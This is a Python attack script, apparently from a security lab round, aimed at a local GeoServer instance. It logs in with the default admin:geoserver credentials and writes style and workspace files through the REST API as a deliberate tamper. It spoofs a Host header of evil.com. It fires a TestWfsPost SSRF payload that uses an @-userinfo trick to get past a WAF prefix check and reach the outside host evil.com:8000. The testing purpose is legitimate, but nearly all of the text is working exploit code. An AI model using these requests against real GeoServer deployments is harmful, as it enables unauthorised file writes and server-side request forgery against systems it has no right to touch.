# -*- coding: utf-8 -*-
"""Final round - GeoServer third volley.

GS-9  Style creation via POST (911100 allows POST): GeoServer REST writes the
      style file into data_dir/styles/ -> app-tree tamper (c) via pure feature
      abuse, CT application/xml (CRS-whitelisted), admin:geoserver default creds.
GS-10 workspace creation (POST) -> second tamper artifact.
GS-11 record-shot: TestWfsPost @-userinfo SSRF through the WAF (3002 prefix
      satisfied) - expect either CRS kill or RASP ssrf_userinput block.
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18382"
s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.headers["Host"] = "evil.com"
AUTH = ("admin", "geoserver")

SLD = """<?xml version="1.0" encoding="UTF-8"?>
<StyledLayerDescriptor version="1.0.0"
 xmlns="http://www.opengis.net/sld" xmlns:ogc="http://www.opengis.net/ogc">
  <NamedLayer><Name>pwn_joint_style</Name><UserStyle><Name>pwn</Name>
  <FeatureTypeStyle><Rule><Name>rule1</Name>
  <PointSymbolizer><Graphic><Mark><WellKnownName>circle</WellKnownName>
  <Fill><CssParameter name="fill">#FF0000</CssParameter></Fill>
  </Mark><Size>6</Size></Graphic></PointSymbolizer>
  </Rule></FeatureTypeStyle></UserStyle></NamedLayer>
</StyledLayerDescriptor>
"""


def show(label, r):
    txt = r.text
    if len(txt) > 160:
        txt = txt[:80] + "...[" + str(len(txt)) + "B]..." + txt[-60:]
    print("[*] %-46s HTTP %s | %s" % (label, r.status_code, txt.replace("\n", " ")[:150]))


def truth():
    out = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1", "sh", "-c",
                          "ls -l --full-time /mnt/geoserver/data_dir/styles/pwn_joint* /mnt/geoserver/data_dir/workspaces/pwn_joint* 2>/dev/null"],
                         capture_output=True, text=True, errors="replace")
    print("[truth]", (out.stdout + out.stderr).strip() or "(no artifacts)")
    out = subprocess.run(["docker", "logs", "multi-round-lab-geoserver-1", "--since", "2m"],
                         capture_output=True, text=True, errors="replace")
    for line in (out.stdout + out.stderr).splitlines():
        if "blocked" in line.lower():
            print("[rasp]", line.strip()[:200])


print("=== GS-9: POST style (feature-abuse file write) ===")
r = s.post(BASE + "/geoserver/rest/styles?name=pwn_joint_style", data=SLD,
           headers={"Content-Type": "application/xml"}, auth=AUTH, timeout=60)
show("POST /rest/styles?name=pwn_joint_style", r)
r = s.get(BASE + "/geoserver/rest/styles/pwn_joint_style.sld", auth=AUTH, timeout=60)
show("GET back the style", r)
time.sleep(2)
truth()

print("\n=== GS-10: POST workspace ===")
r = s.post(BASE + "/geoserver/rest/workspaces",
           data="<workspace><name>pwn_joint_ws</name></workspace>",
           headers={"Content-Type": "application/xml"}, auth=AUTH, timeout=60)
show("POST /rest/workspaces", r)
time.sleep(1)
truth()

print("\n=== GS-11: TestWfsPost @-userinfo SSRF record shot ===")
s2 = requests.Session()
s2.trust_env = False
s2.verify = False
s2.headers["User-Agent"] = "Mozilla/5.0"
r = s2.post(BASE + "/geoserver/TestWfsPost",
            data={"url": "http://127.0.0.1:18382/geoserver@evil.com:8000/rt/gs_userinfo_b"},
            headers={"Host": "127.0.0.1:18382"}, timeout=60)
show("TestWfsPost url prefix+@userinfo", r)
time.sleep(2)
out = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "2m"],
                     capture_output=True, text=True, errors="replace")
for line in (out.stdout + out.stderr).splitlines():
    if "gs_userinfo" in line:
        print("[infra]", line.strip())
